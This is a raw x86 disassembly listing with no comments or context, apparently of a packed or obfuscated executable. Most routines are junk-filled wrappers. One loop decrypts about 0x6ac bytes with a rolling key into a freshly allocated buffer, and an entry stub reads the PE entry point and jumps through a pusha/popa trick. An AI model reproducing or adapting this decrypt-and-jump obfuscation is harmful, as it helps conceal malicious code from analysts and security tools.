  4d077a:	jne    0x4d0769
  4d077c:	pop    edx
  4d077d:	add    esp,0x3c
  4d0780:	pop    ebp
  4d0781:	ret    
  4d0782:	add    BYTE PTR [eax],al
  4d0784:	pop    edi
  4d0785:	call   DWORD PTR ds:0x4d2018
  4d078b:	call   edi
  4d078d:	add    BYTE PTR [eax],al
  4d078f:	add    BYTE PTR [edi-0x1],bl
  4d0792:	adc    eax,0x4d207c
  4d0797:	call   edi
  4d0799:	add    BYTE PTR [eax],al
  4d079b:	add    BYTE PTR [edi-0x1],bl
  4d079e:	adc    eax,0x4d20a0
  4d07a3:	call   edi
  4d07a5:	add    BYTE PTR [eax],al
  4d07a7:	add    BYTE PTR [edi-0x1],bl
  4d07aa:	adc    eax,0x4d2028
  4d07af:	call   edi
  4d07b1:	add    BYTE PTR [eax],al
  4d07b3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d07b9:	sub    esp,0x24
  4d07bc:	lea    esi,ds:0x4d3114
  4d07c2:	add    DWORD PTR [esi+0x9c],0x5195
  4d07cc:	push   0x0
  4d07ce:	call   0x4d0df8
  4d07d3:	add    esp,0x4
  4d07d6:	push   esi
  4d07d7:	push   edx
  4d07d8:	push   DWORD PTR [esi+0xac]
  4d07de:	call   0x4d122c
  4d07e3:	add    esp,0x8
  4d07e6:	pop    esi
  4d07e7:	mov    ebx,0x4d2000
  4d07ec:	mov    ebx,DWORD PTR [ebx]
  4d07ee:	push   ebx
  4d07ef:	push   DWORD PTR [esi+0x14]
  4d07f2:	pop    ecx
  4d07f3:	call   ecx
  4d07f5:	add    esp,0x24
  4d07f8:	pop    ebp
  4d07f9:	ret    
  4d07fa:	add    BYTE PTR [eax],al
  4d07fc:	mov    edi,edi
  4d07fe:	push   ebp
  4d07ff:	mov    ebp,esp
  4d0801:	sub    esp,0x24
  4d0804:	lea    eax,ds:0x4d3174
  4d080a:	cmp    eax,0xd19
  4d080f:	je     0x4d07ff
  4d0811:	push   eax
  4d0812:	mov    eax,0x0
  4d0817:	push   eax
  4d0818:	call   0x4d1024
  4d081d:	add    esp,0x4
  4d0820:	pop    eax
  4d0821:	push   eax
  4d0822:	push   edx
  4d0823:	push   DWORD PTR [eax+0x4c]
  4d0826:	push   DWORD PTR [eax+0x1d8]
  4d082c:	call   0x4d08e0
  4d0831:	add    esp,0xc
  4d0834:	pop    eax
  4d0835:	push   eax
  4d0836:	mov    ebx,0xfffffff4
  4d083b:	push   ebx
  4d083c:	call   0x4d1374
  4d0841:	add    esp,0x4
  4d0844:	pop    eax
  4d0845:	add    esp,0x24
  4d0848:	pop    ebp
  4d0849:	ret    
  4d084a:	add    BYTE PTR [eax],al
  4d084c:	pop    edi
  4d084d:	call   DWORD PTR ds:0x4d209c
  4d0853:	call   edi
  4d0855:	add    BYTE PTR [eax],al
  4d0857:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d085d:	sub    esp,0x20
  4d0860:	lea    esi,ds:0x4d3190
  4d0866:	xor    ebx,DWORD PTR [esi+0x58]
  4d0869:	push   esi
  4d086a:	push   edi
  4d086b:	push   DWORD PTR [esi+0x1e4]
  4d0871:	call   0x4d11d0
  4d0876:	add    esp,0x8
  4d0879:	pop    esi
  4d087a:	call   0x4d1538
  4d087f:	add    esp,0x4
  4d0882:	push   0x0
  4d0884:	call   0x4d0f48
  4d0889:	add    esp,0x4
  4d088c:	add    esp,0x20
  4d088f:	pop    ebp
  4d0890:	ret    
  4d0891:	add    BYTE PTR [eax],al
  4d0893:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0899:	sub    esp,0x4c
  4d089c:	lea    ecx,ds:0x4d3030
  4d08a2:	mov    DWORD PTR [ecx-0x4],edi
  4d08a5:	push   ecx
  4d08a6:	push   DWORD PTR [ecx+0x5c]
  4d08a9:	push   edx
  4d08aa:	push   edi
  4d08ab:	call   0x4d0f54
  4d08b0:	add    esp,0xc
  4d08b3:	pop    ecx
  4d08b4:	push   ecx
  4d08b5:	push   0x0
  4d08b7:	call   0x4d14e4
  4d08bc:	add    esp,0x4
  4d08bf:	pop    ecx
  4d08c0:	push   ecx
  4d08c1:	push   0x0
  4d08c3:	call   0x4d0a54
  4d08c8:	add    esp,0x4
  4d08cb:	pop    ecx
  4d08cc:	add    esp,0x4c
  4d08cf:	pop    ebp
  4d08d0:	ret    
  4d08d1:	add    BYTE PTR [eax],al
  4d08d3:	add    BYTE PTR [edi-0x1],bl
  4d08d6:	adc    eax,0x4d2000
  4d08db:	call   edi
  4d08dd:	add    BYTE PTR [eax],al
  4d08df:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d08e5:	sub    esp,0x4c
  4d08e8:	lea    esi,ds:0x4d3014
  4d08ee:	or     edx,DWORD PTR [ebp-0x3c]
  4d08f1:	push   esi
  4d08f2:	push   edi
  4d08f3:	push   edi
  4d08f4:	push   DWORD PTR [esi+0xb0]
  4d08fa:	push   DWORD PTR [esi+0x4]
  4d08fd:	call   0x4d06ec
  4d0902:	add    esp,0x10
  4d0905:	pop    esi
  4d0906:	call   0x4d07a8
  4d090b:	add    esp,0x4
  4d090e:	mov    edx,0x0
  4d0913:	push   edx
  4d0914:	call   0x4d12b0
  4d0919:	add    esp,0x4
  4d091c:	add    esp,0x4c
  4d091f:	pop    ebp
  4d0920:	ret    
  4d0921:	add    BYTE PTR [eax],al
  4d0923:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0929:	sub    esp,0x4c
  4d092c:	sub    DWORD PTR [ebp-0x48],ebx
  4d092f:	mov    edi,0x4d31e4
  4d0934:	push   edi
  4d0935:	push   0x6ac
  4d093a:	push   0x6ac
  4d093f:	mov    eax,0x40001
  4d0944:	push   eax
  4d0945:	mov    ecx,0x862985b6
  4d094a:	push   DWORD PTR [ecx+0x7a239a86]
  4d0950:	sub    DWORD PTR [esp],0x2
  4d0954:	mov    ecx,0x4d2034
  4d0959:	pop    DWORD PTR [ecx]
  4d095b:	call   0x4d135c
  4d0960:	add    esp,0x4
  4d0963:	xchg   DWORD PTR [esp],eax
  4d0966:	mov    edi,eax
  4d0968:	pop    DWORD PTR [edi-0xbc]
  4d096e:	mov    edx,DWORD PTR [edi-0xbc]
  4d0974:	mov    eax,edx
  4d0976:	sub    esi,esi
  4d0978:	dec    esi
  4d0979:	and    esi,0x4d0014
  4d097f:	mov    ecx,0x8d9ae218
  4d0984:	xor    edx,edx
  4d0986:	cmp    edx,0x6ac
  4d098c:	je     0x4d09aa
  4d098e:	sub    edx,0xfffffffc
  4d0991:	xor    ebx,ebx
  4d0993:	push   DWORD PTR [esi+ebx*1]
  4d0996:	add    DWORD PTR [esp],ecx
  4d0999:	pop    DWORD PTR [eax+ebx*2]
  4d099c:	dec    DWORD PTR [eax]
  4d099e:	xor    ecx,ecx
  4d09a0:	add    ecx,DWORD PTR [esi]
  4d09a2:	add    esi,0x4
  4d09a5:	add    eax,0x4
  4d09a8:	jmp    0x4d0986
  4d09aa:	push   edi
  4d09ab:	push   0x0
  4d09ad:	call   0x4d14e4
  4d09b2:	add    esp,0x4
  4d09b5:	pop    edi
  4d09b6:	add    esp,0x4c
  4d09b9:	pop    ebp
  4d09ba:	ret    
  4d09bb:	add    BYTE PTR [edi-0x1],bl
  4d09be:	adc    eax,0x4d2088
  4d09c3:	call   edi
  4d09c5:	add    BYTE PTR [eax],al
  4d09c7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d09cd:	sub    esp,0x28
  4d09d0:	lea    ebx,[eax-0x74]
  4d09d3:	add    edx,ebx
  4d09d5:	push   ebx
  4d09d6:	push   eax
  4d09d7:	push   eax
  4d09d8:	call   0x4d14f0
  4d09dd:	add    esp,0x8
  4d09e0:	pop    ebx
  4d09e1:	call   0x4d0e04
  4d09e6:	add    esp,0x4
  4d09e9:	mov    ecx,0x0
  4d09ee:	push   ecx
  4d09ef:	call   0x4d0df8
  4d09f4:	add    esp,0x4
  4d09f7:	add    esp,0x28
  4d09fa:	pop    ebp
  4d09fb:	ret    
  4d09fc:	pop    edi
  4d09fd:	call   DWORD PTR ds:0x4d205c
  4d0a03:	call   edi
  4d0a05:	add    BYTE PTR [eax],al
  4d0a07:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0a0d:	sub    esp,0x24
  4d0a10:	lea    ebx,ds:0x4d30b8
  4d0a16:	sub    DWORD PTR [ebx+0x44],0xffff85d0
  4d0a1d:	push   ebx
  4d0a1e:	push   edi
  4d0a1f:	push   DWORD PTR [ebx+0x54]
  4d0a22:	push   DWORD PTR [ebx+0x1e8]
  4d0a28:	push   DWORD PTR [ebx+0x1b8]
  4d0a2e:	call   0x4d103c
  4d0a33:	add    esp,0x10
  4d0a36:	pop    ebx
  4d0a37:	mov    edx,0x0
  4d0a3c:	push   edx
  4d0a3d:	call   0x4d0a54
  4d0a42:	add    esp,0x4
  4d0a45:	call   0x4d07a8
  4d0a4a:	add    esp,0x4
  4d0a4d:	add    esp,0x24
  4d0a50:	pop    ebp
  4d0a51:	ret    
  4d0a52:	add    BYTE PTR [eax],al
  4d0a54:	pop    edi
  4d0a55:	call   DWORD PTR ds:0x4d2080
  4d0a5b:	call   edi
  4d0a5d:	add    BYTE PTR [eax],al
  4d0a5f:	add    BYTE PTR [edi-0x1],bl
  4d0a62:	adc    eax,0x4d201c
  4d0a67:	call   edi
  4d0a69:	add    BYTE PTR [eax],al
  4d0a6b:	add    BYTE PTR [edi-0x1],bl
  4d0a6e:	adc    eax,0x4d2070
  4d0a73:	call   edi
  4d0a75:	add    BYTE PTR [eax],al
  4d0a77:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0a7d:	sub    esp,0x2c
  4d0a80:	mov    ebx,0x4d311c
  4d0a85:	sbb    ecx,DWORD PTR [ebp-0x4]
  4d0a88:	push   ebx
  4d0a89:	push   eax
  4d0a8a:	push   DWORD PTR [ebx+0x1d0]
  4d0a90:	push   DWORD PTR [ebx+0x118]
  4d0a96:	call   0x4d1544
  4d0a9b:	add    esp,0xc
  4d0a9e:	pop    ebx
  4d0a9f:	push   0x0
  4d0aa1:	call   0x4d12b0
  4d0aa6:	add    esp,0x4
  4d0aa9:	call   0x4d1538
  4d0aae:	add    esp,0x4
  4d0ab1:	add    esp,0x2c
  4d0ab4:	pop    ebp
  4d0ab5:	ret    
  4d0ab6:	add    BYTE PTR [eax],al
  4d0ab8:	mov    edi,edi
  4d0aba:	push   ebp
  4d0abb:	mov    ebp,esp
  4d0abd:	sub    esp,0x44
  4d0ac0:	lea    esi,ds:0x4d3040
  4d0ac6:	mov    edx,esi
  4d0ac8:	push   esi
  4d0ac9:	push   edx
  4d0aca:	push   DWORD PTR [esi+0xc]
  4d0acd:	push   edi
  4d0ace:	call   0x4d14a4
  4d0ad3:	add    esp,0xc
  4d0ad6:	pop    esi
  4d0ad7:	mov    ebx,0xfffffff4
  4d0adc:	push   ebx
  4d0add:	call   0x4d1374
  4d0ae2:	add    esp,0x4
  4d0ae5:	call   0x4d1538
  4d0aea:	add    esp,0x4
  4d0aed:	add    esp,0x44
  4d0af0:	pop    ebp
  4d0af1:	ret    
  4d0af2:	add    BYTE PTR [eax],al
  4d0af4:	pop    edi
  4d0af5:	call   DWORD PTR ds:0x4d2054
  4d0afb:	call   edi
  4d0afd:	add    BYTE PTR [eax],al
  4d0aff:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0b05:	sub    esp,0x48
  4d0b08:	lea    edx,[eax-0xe4]
  4d0b0e:	sub    eax,0xffffff88
  4d0b11:	push   edx
  4d0b12:	mov    edx,0xfffffff4
  4d0b17:	push   edx
  4d0b18:	call   0x4d1374
  4d0b1d:	add    esp,0x4
  4d0b20:	pop    edx
  4d0b21:	push   edx
  4d0b22:	push   ebx
  4d0b23:	push   DWORD PTR [edx+0x80]
  4d0b29:	call   0x4d1404
  4d0b2e:	add    esp,0x8
  4d0b31:	pop    edx
  4d0b32:	push   edx
  4d0b33:	push   0x0
  4d0b35:	call   0x4d14e4
  4d0b3a:	add    esp,0x4
  4d0b3d:	pop    edx
  4d0b3e:	add    esp,0x48
  4d0b41:	pop    ebp
  4d0b42:	ret    
  4d0b43:	add    BYTE PTR [edi-0x1],bl
  4d0b46:	adc    eax,0x4d2068
  4d0b4b:	call   edi
  4d0b4d:	add    BYTE PTR [eax],al
  4d0b4f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0b55:	sub    esp,0x28
  4d0b58:	lea    ecx,[edi-0x14]
  4d0b5b:	mov    DWORD PTR [ebp-0x20],eax
  4d0b5e:	push   ecx
  4d0b5f:	push   DWORD PTR [ecx+0x150]
  4d0b65:	push   DWORD PTR [ecx]
  4d0b67:	push   ebx
  4d0b68:	push   eax
  4d0b69:	call   0x4d0a08
  4d0b6e:	add    esp,0x10
  4d0b71:	pop    ecx
  4d0b72:	push   ecx
  4d0b73:	mov    esi,0x0
  4d0b78:	push   esi
  4d0b79:	call   0x4d0a54
  4d0b7e:	add    esp,0x4
  4d0b81:	pop    ecx
  4d0b82:	push   ecx
  4d0b83:	push   0x0
  4d0b85:	call   0x4d0df8
  4d0b8a:	add    esp,0x4
  4d0b8d:	pop    ecx
  4d0b8e:	add    esp,0x28
  4d0b91:	pop    ebp
  4d0b92:	ret    
  4d0b93:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0b99:	sub    esp,0x30
  4d0b9c:	lea    edi,[esi+0x120]
  4d0ba2:	cmp    edi,0x69b7
  4d0ba8:	jb     0x4d0b97
  4d0baa:	push   edi
  4d0bab:	push   edx
  4d0bac:	push   eax
  4d0bad:	call   0x4d0e74
  4d0bb2:	add    esp,0x8
  4d0bb5:	pop    edi
  4d0bb6:	push   edi
  4d0bb7:	push   0x0
  4d0bb9:	call   0x4d0a6c
  4d0bbe:	add    esp,0x4
  4d0bc1:	pop    edi
  4d0bc2:	push   edi
  4d0bc3:	mov    ecx,0x0
  4d0bc8:	push   ecx
  4d0bc9:	call   0x4d0a54
  4d0bce:	add    esp,0x4
  4d0bd1:	pop    edi
  4d0bd2:	add    esp,0x30
  4d0bd5:	pop    ebp
  4d0bd6:	ret    
  4d0bd7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0bdd:	sub    esp,0x50
  4d0be0:	lea    esi,ds:0x4d315c
  4d0be6:	adc    DWORD PTR [ebp-0x44],ebx
  4d0be9:	push   esi
  4d0bea:	push   eax
  4d0beb:	push   DWORD PTR [esi+0xf0]
  4d0bf1:	push   DWORD PTR [esi+0xc0]
  4d0bf7:	push   DWORD PTR [esi+0x13c]
  4d0bfd:	call   0x4d0db0
  4d0c02:	add    esp,0x10
  4d0c05:	pop    esi
  4d0c06:	call   0x4d0e04
  4d0c0b:	add    esp,0x4
  4d0c0e:	mov    ebx,0x0
  4d0c13:	push   ebx
  4d0c14:	call   0x4d0cc0
  4d0c19:	add    esp,0x4
  4d0c1c:	add    esp,0x50
  4d0c1f:	pop    ebp
  4d0c20:	ret    
  4d0c21:	add    BYTE PTR [eax],al
  4d0c23:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0c29:	sub    esp,0x20
  4d0c2c:	lea    esi,[ecx-0x100]
  4d0c32:	cmp    esi,0x5da2
  4d0c38:	jbe    0x4d0c27
  4d0c3a:	call   0x4d0e04
  4d0c3f:	add    esp,0x4
  4d0c42:	push   esi
  4d0c43:	push   eax
  4d0c44:	push   ecx
  4d0c45:	push   edi
  4d0c46:	call   0x4d0b94
  4d0c4b:	add    esp,0xc
  4d0c4e:	pop    esi
  4d0c4f:	push   0x0
  4d0c51:	call   0x4d14e4
  4d0c56:	add    esp,0x4
  4d0c59:	add    esp,0x20
  4d0c5c:	pop    ebp
  4d0c5d:	ret    
  4d0c5e:	add    BYTE PTR [eax],al
  4d0c60:	push   edi
  4d0c61:	sub    edi,edi
  4d0c63:	push   edi
  4d0c64:	push   edi
  4d0c65:	push   edi
  4d0c66:	push   edi
  4d0c67:	call   0x4d07a8
  4d0c6c:	sub    esp,0xfffffffc
  4d0c6f:	call   0x4d0a60
  4d0c74:	push   0x2
  4d0c76:	xor    eax,eax
  4d0c78:	sub    eax,0x4d3030
  4d0c7d:	neg    eax
  4d0c7f:	push   0x0
  4d0c81:	lea    ecx,[eax+0x4]
  4d0c84:	add    BYTE PTR [ecx],0x3
  4d0c87:	push   eax
  4d0c88:	call   0x4d135c
  4d0c8d:	pop    edi
  4d0c8e:	pop    edi
  4d0c8f:	pop    edi
  4d0c90:	lea    ecx,[eax+0x3b]
  4d0c93:	mov    edi,DWORD PTR [ecx]
  4d0c95:	lea    eax,[eax+edi*1]
  4d0c98:	mov    eax,DWORD PTR [eax+0x28]
  4d0c9b:	pusha  
  4d0c9c:	mov    ah,0x45
  4d0c9e:	sub    al,ah
  4d0ca0:	ja     0x4d07b4
  4d0ca6:	popa   
  4d0ca7:	ret    
  4d0ca8:	pop    edi
  4d0ca9:	call   DWORD PTR ds:0x4d200c
  4d0caf:	call   edi
  4d0cb1:	add    BYTE PTR [eax],al
  4d0cb3:	add    BYTE PTR [edi-0x1],bl
  4d0cb6:	adc    eax,0x4d2060
  4d0cbb:	call   edi
  4d0cbd:	add    BYTE PTR [eax],al
  4d0cbf:	add    BYTE PTR [edi-0x1],bl
  4d0cc2:	adc    eax,0x4d2004
  4d0cc7:	call   edi
  4d0cc9:	add    BYTE PTR [eax],al
  4d0ccb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0cd1:	sub    esp,0x58
  4d0cd4:	lea    edx,[edi+0x84]
  4d0cda:	add    DWORD PTR [ebp-0x54],0x1c
  4d0cde:	push   edx
  4d0cdf:	mov    edx,0x0
  4d0ce4:	push   edx
  4d0ce5:	call   0x4d12b0
  4d0cea:	add    esp,0x4
  4d0ced:	pop    edx
  4d0cee:	push   edx
  4d0cef:	push   DWORD PTR [edx+0xe4]
  4d0cf5:	push   DWORD PTR [edx+0xf0]
  4d0cfb:	call   0x4d0ab8
  4d0d00:	add    esp,0x8
  4d0d03:	pop    edx
  4d0d04:	push   edx
  4d0d05:	push   0x0
  4d0d07:	call   0x4d0df8
  4d0d0c:	add    esp,0x4
  4d0d0f:	pop    edx
  4d0d10:	add    esp,0x58
  4d0d13:	pop    ebp
  4d0d14:	ret    
  4d0d15:	add    BYTE PTR [eax],al
  4d0d17:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0d1d:	sub    esp,0x20
  4d0d20:	mov    edx,0x4d315c
  4d0d25:	mov    DWORD PTR [ebp-0x1c],0x1
  4d0d2c:	push   edx
  4d0d2d:	push   DWORD PTR [edx+0x158]
  4d0d33:	push   esi
  4d0d34:	call   0x4d112c
  4d0d39:	add    esp,0x8
  4d0d3c:	pop    edx
  4d0d3d:	push   edx
  4d0d3e:	mov    edi,0x0
  4d0d43:	push   edi
  4d0d44:	call   0x4d0cb4
  4d0d49:	add    esp,0x4
  4d0d4c:	pop    edx
  4d0d4d:	push   edx
  4d0d4e:	mov    ebx,0x0
  4d0d53:	push   ebx
  4d0d54:	call   0x4d0f48
  4d0d59:	add    esp,0x4
  4d0d5c:	pop    edx
  4d0d5d:	add    esp,0x20
  4d0d60:	pop    ebp
  4d0d61:	ret    
  4d0d62:	add    BYTE PTR [eax],al
  4d0d64:	mov    edi,edi
  4d0d66:	push   ebp
  4d0d67:	mov    ebp,esp
  4d0d69:	sub    esp,0x38
  4d0d6c:	lea    ebx,ds:0x4d307c
  4d0d72:	mov    ecx,edx
  4d0d74:	push   ebx
  4d0d75:	push   eax
  4d0d76:	push   DWORD PTR [ebx+0x1fc]
  4d0d7c:	push   esi
  4d0d7d:	call   0x4d0d18
  4d0d82:	add    esp,0xc
  4d0d85:	pop    ebx
  4d0d86:	push   0x0
  4d0d88:	call   0x4d1024
  4d0d8d:	add    esp,0x4
  4d0d90:	mov    ecx,0x0
  4d0d95:	push   ecx
  4d0d96:	call   0x4d1080
  4d0d9b:	add    esp,0x4
  4d0d9e:	add    esp,0x38
  4d0da1:	pop    ebp
  4d0da2:	ret    
  4d0da3:	add    BYTE PTR [edi-0x1],bl
  4d0da6:	adc    eax,0x4d2064
  4d0dab:	call   edi
  4d0dad:	add    BYTE PTR [eax],al
  4d0daf:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0db5:	sub    esp,0x40
  4d0db8:	lea    eax,[esi-0x44]
  4d0dbb:	sbb    DWORD PTR [ebp-0x1c],0x4501
  4d0dc2:	push   eax
  4d0dc3:	push   DWORD PTR [eax+0x28]
  4d0dc6:	push   ecx
  4d0dc7:	call   0x4d0b00
  4d0dcc:	add    esp,0x8
  4d0dcf:	pop    eax
  4d0dd0:	push   eax
  4d0dd1:	lea    edi,[eax-0x118]
  4d0dd7:	push   edi
  4d0dd8:	call   0x4d08d4
  4d0ddd:	add    esp,0x4
  4d0de0:	test   eax,eax
  4d0de2:	jne    0x4d0dd1
  4d0de4:	pop    eax
  4d0de5:	push   eax
  4d0de6:	push   0x0
  4d0de8:	call   0x4d0df8
  4d0ded:	add    esp,0x4
  4d0df0:	pop    eax
  4d0df1:	add    esp,0x40
  4d0df4:	pop    ebp
  4d0df5:	ret    
  4d0df6:	add    BYTE PTR [eax],al
  4d0df8:	pop    edi
  4d0df9:	call   DWORD PTR ds:0x4d2040
  4d0dff:	call   edi
  4d0e01:	add    BYTE PTR [eax],al
  4d0e03:	add    BYTE PTR [edi-0x1],bl
  4d0e06:	adc    eax,0x4d204c
  4d0e0b:	call   edi
  4d0e0d:	add    BYTE PTR [eax],al
  4d0e0f:	add    BYTE PTR [edi-0x1],bl
  4d0e12:	adc    eax,0x4d2074
  4d0e17:	call   edi
  4d0e19:	add    BYTE PTR [eax],al
  4d0e1b:	add    BYTE PTR [edi-0x1],bl
  4d0e1e:	adc    eax,0x4d2098
  4d0e23:	call   edi
  4d0e25:	add    BYTE PTR [eax],al
  4d0e27:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0e2d:	sub    esp,0x3c
  4d0e30:	lea    ecx,ds:0x4d3024
  4d0e36:	xor    esi,DWORD PTR [ecx+0x1a8]
  4d0e3c:	push   ecx
  4d0e3d:	mov    ebx,0x0
  4d0e42:	push   ebx
  4d0e43:	call   0x4d1080
  4d0e48:	add    esp,0x4
  4d0e4b:	pop    ecx
  4d0e4c:	push   ecx
  4d0e4d:	push   ebx
  4d0e4e:	push   DWORD PTR [ecx+0xe4]
  4d0e54:	push   ebx
  4d0e55:	push   DWORD PTR [ecx+0x100]
  4d0e5b:	call   0x4d1580
  4d0e60:	add    esp,0x10
  4d0e63:	pop    ecx
  4d0e64:	push   ecx
  4d0e65:	call   0x4d1538
  4d0e6a:	add    esp,0x4
  4d0e6d:	pop    ecx
  4d0e6e:	add    esp,0x3c
  4d0e71:	pop    ebp
  4d0e72:	ret    
  4d0e73:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0e79:	sub    esp,0x1c
  4d0e7c:	mov    eax,0x4d3170
  4d0e81:	or     edx,ecx
  4d0e83:	push   eax
  4d0e84:	call   0x4d07a8
  4d0e89:	add    esp,0x4
  4d0e8c:	pop    eax
  4d0e8d:	push   eax
  4d0e8e:	push   DWORD PTR [eax+0x18]
  4d0e91:	push   DWORD PTR [eax+0x1f4]
  4d0e97:	push   DWORD PTR [eax+0x1f8]
  4d0e9d:	push   edx
  4d0e9e:	call   0x4d0894
  4d0ea3:	add    esp,0x10
  4d0ea6:	pop    eax
  4d0ea7:	push   eax
  4d0ea8:	call   0x4d1538
  4d0ead:	add    esp,0x4
  4d0eb0:	pop    eax
  4d0eb1:	add    esp,0x1c
  4d0eb4:	pop    ebp
  4d0eb5:	ret    
  4d0eb6:	add    BYTE PTR [eax],al
  4d0eb8:	mov    edi,edi
  4d0eba:	push   ebp
  4d0ebb:	mov    ebp,esp
  4d0ebd:	sub    esp,0x24
  4d0ec0:	lea    ecx,ds:0x4d31ac
  4d0ec6:	and    edi,ebx
  4d0ec8:	push   ecx
  4d0ec9:	push   DWORD PTR [ecx+0xf8]
  4d0ecf:	push   DWORD PTR [ecx+0xec]
  4d0ed5:	push   edi
  4d0ed6:	call   0x4d0bd8
  4d0edb:	add    esp,0xc
  4d0ede:	pop    ecx
  4d0edf:	push   ecx
  4d0ee0:	mov    eax,0x0
  4d0ee5:	push   eax
  4d0ee6:	call   0x4d0df8
  4d0eeb:	add    esp,0x4
  4d0eee:	pop    ecx
  4d0eef:	push   ecx
  4d0ef0:	push   0xfffffff4
  4d0ef2:	call   0x4d1374
  4d0ef7:	add    esp,0x4
  4d0efa:	pop    ecx
  4d0efb:	add    esp,0x24
  4d0efe:	pop    ebp
  4d0eff:	ret    
  4d0f00:	mov    edi,edi
  4d0f02:	push   ebp
  4d0f03:	mov    ebp,esp
  4d0f05:	sub    esp,0x5c
  4d0f08:	mov    eax,0x4d3028
  4d0f0d:	and    edx,0xffffee72
  4d0f13:	push   eax
  4d0f14:	push   DWORD PTR [eax+0x48]
  4d0f17:	push   ebx
  4d0f18:	push   ebx
  4d0f19:	call   0x4d0eb8
  4d0f1e:	add    esp,0xc
  4d0f21:	pop    eax
  4d0f22:	push   eax
  4d0f23:	lea    esi,[eax-0x28]
  4d0f26:	push   esi
  4d0f27:	call   0x4d08d4
  4d0f2c:	add    esp,0x4
  4d0f2f:	test   eax,eax
  4d0f31:	jne    0x4d0f23
  4d0f33:	pop    eax
  4d0f34:	push   eax
  4d0f35:	push   0x0
  4d0f37:	call   0x4d1024
  4d0f3c:	add    esp,0x4
  4d0f3f:	pop    eax
  4d0f40:	add    esp,0x5c
  4d0f43:	pop    ebp
  4d0f44:	ret    
  4d0f45:	add    BYTE PTR [eax],al
  4d0f47:	add    BYTE PTR [edi-0x1],bl
  4d0f4a:	adc    eax,0x4d2024
  4d0f4f:	call   edi
  4d0f51:	add    BYTE PTR [eax],al
  4d0f53:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0f59:	sub    esp,0x28
  4d0f5c:	lea    eax,ds:0x4d31b8
  4d0f62:	mov    DWORD PTR [eax-0x14],0x5f
  4d0f69:	push   eax
  4d0f6a:	push   ecx
  4d0f6b:	push   DWORD PTR [eax+0x178]
  4d0f71:	push   ecx
  4d0f72:	call   0x4d0d64
  4d0f77:	add    esp,0xc
  4d0f7a:	pop    eax
  4d0f7b:	push   eax
  4d0f7c:	push   0x0
  4d0f7e:	call   0x4d12b0
  4d0f83:	add    esp,0x4
  4d0f86:	pop    eax
  4d0f87:	push   eax
  4d0f88:	call   0x4d07a8
  4d0f8d:	add    esp,0x4
  4d0f90:	pop    eax
  4d0f91:	add    esp,0x28
  4d0f94:	pop    ebp
  4d0f95:	ret    
  4d0f96:	add    BYTE PTR [eax],al
  4d0f98:	mov    edi,edi
  4d0f9a:	push   ebp
  4d0f9b:	mov    ebp,esp
  4d0f9d:	sub    esp,0x60
  4d0fa0:	lea    ebx,[eax+0x30]
  4d0fa3:	xor    esi,DWORD PTR [ebx+0xa0]
  4d0fa9:	push   ebx
  4d0faa:	push   DWORD PTR [ebx+0x1ac]
  4d0fb0:	push   DWORD PTR [ebx+0x1c0]
  4d0fb6:	call   0x4d1098
  4d0fbb:	add    esp,0x8
  4d0fbe:	pop    ebx
  4d0fbf:	lea    edi,[ebx-0x44]
  4d0fc2:	push   edi
  4d0fc3:	call   0x4d08d4
  4d0fc8:	add    esp,0x4
  4d0fcb:	test   eax,eax
  4d0fcd:	jne    0x4d0fc0
  4d0fcf:	mov    eax,0x0
  4d0fd4:	push   eax
  4d0fd5:	call   0x4d0a6c
  4d0fda:	add    esp,0x4
  4d0fdd:	add    esp,0x60
  4d0fe0:	pop    ebp
  4d0fe1:	ret    
  4d0fe2:	add    BYTE PTR [eax],al
  4d0fe4:	mov    edi,edi
  4d0fe6:	push   ebp
  4d0fe7:	mov    ebp,esp
  4d0fe9:	sub    esp,0x40
  4d0fec:	lea    edx,ds:0x4d3098
  4d0ff2:	and    eax,DWORD PTR [edx-0xc]
  4d0ff5:	push   edx
  4d0ff6:	call   0x4d0e04
  4d0ffb:	add    esp,0x4
  4d0ffe:	pop    edx
  4d0fff:	push   edx
  4d1000:	push   ecx
  4d1001:	push   edi
  4d1002:	push   eax
  4d1003:	push   DWORD PTR [edx+0xe0]
  4d1009:	call   0x4d1398
  4d100e:	add    esp,0x10
  4d1011:	pop    edx
  4d1012:	push   edx
  4d1013:	call   0x4d07a8
  4d1018:	add    esp,0x4
  4d101b:	pop    edx
  4d101c:	add    esp,0x40
  4d101f:	pop    ebp
  4d1020:	ret    
  4d1021:	add    BYTE PTR [eax],al
  4d1023:	add    BYTE PTR [edi-0x1],bl
  4d1026:	adc    eax,0x4d2008
  4d102b:	call   edi
  4d102d:	add    BYTE PTR [eax],al
  4d102f:	add    BYTE PTR [edi-0x1],bl
  4d1032:	adc    eax,0x4d2058
  4d1037:	call   edi
  4d1039:	add    BYTE PTR [eax],al
  4d103b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1041:	sub    esp,0x20
  4d1044:	lea    edi,ds:0x4d3070
  4d104a:	add    ecx,DWORD PTR [ebp-0x14]
  4d104d:	push   edi
  4d104e:	push   edx
  4d104f:	push   eax
  4d1050:	push   DWORD PTR [edi+0x40]
  4d1053:	push   eax
  4d1054:	call   0x4d0e28
  4d1059:	add    esp,0x10
  4d105c:	pop    edi
  4d105d:	push   edi
  4d105e:	lea    edi,[edi-0x70]
  4d1061:	push   edi
  4d1062:	call   0x4d08d4
  4d1067:	add    esp,0x4
  4d106a:	test   eax,eax
  4d106c:	jne    0x4d105e
  4d106e:	pop    edi
  4d106f:	push   edi
  4d1070:	call   0x4d0e04
  4d1075:	add    esp,0x4
  4d1078:	pop    edi
  4d1079:	add    esp,0x20
  4d107c:	pop    ebp
  4d107d:	ret    
  4d107e:	add    BYTE PTR [eax],al
